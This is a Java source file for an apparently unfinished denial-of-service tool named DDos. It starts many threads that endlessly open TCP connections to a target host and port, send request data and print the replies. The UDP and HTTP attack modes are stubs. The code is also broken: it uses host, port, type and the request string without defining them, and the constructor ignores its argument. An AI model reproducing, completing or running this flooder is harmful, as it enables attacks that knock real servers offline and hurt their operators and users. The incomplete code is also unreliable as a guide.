package ljs.ddos;

import ljs.io.IOUtil;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class DDos {
    private int threadNumber;

    public DDos(SocketRequestBuild socketRequestBuild, int threadNumber) {
        this.threadNumber = threadNumber;
    }

    private class AttachRunnable implements Runnable {
        private void tcpAttack() throws IOException {
            Socket tcpSocket = null;
            try {
                tcpSocket = new Socket(host, port);
                //String httpGetRequestData = "GET / HTTP/1.1\r\nHOST: " + host + "\r\n\r\n";
                IOUtil.write(httpGetRequestData, tcpSocket.getOutputStream(), "UTF-8", false);
                byte[] data = IOUtil.read(tcpSocket.getInputStream());
                System.out.println(new String(data));
                tcpSocket.close();
            } finally {
                IOUtil.close(tcpSocket);
            }
        }

        private void httpAttack() {
            throw new RuntimeException("no implement");
        }

        private void udpAttack() {
            throw new RuntimeException("no implement");
        }

        @Override
        public void run() {
            while (true) {
                try {
                    switch (type) {
                        case TCP:
                            tcpAttack();
                            break;
                        case UDP:
                            udpAttack();
                            break;
                        case HTTP:
                            httpAttack();
                            break;
                        default:
                            throw new RuntimeException("未知攻击类型");
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public List<Thread> attack() {
        List<Thread> attachThreads = new ArrayList<>();
        for (int i = 0; i < threadNumber; i++) {
            Thread attachThread = new Thread(new AttachRunnable(), "ddos-" + i);
            attachThreads.add(attachThread);
            attachThread.start();
        }
        return attachThreads;
    }
}
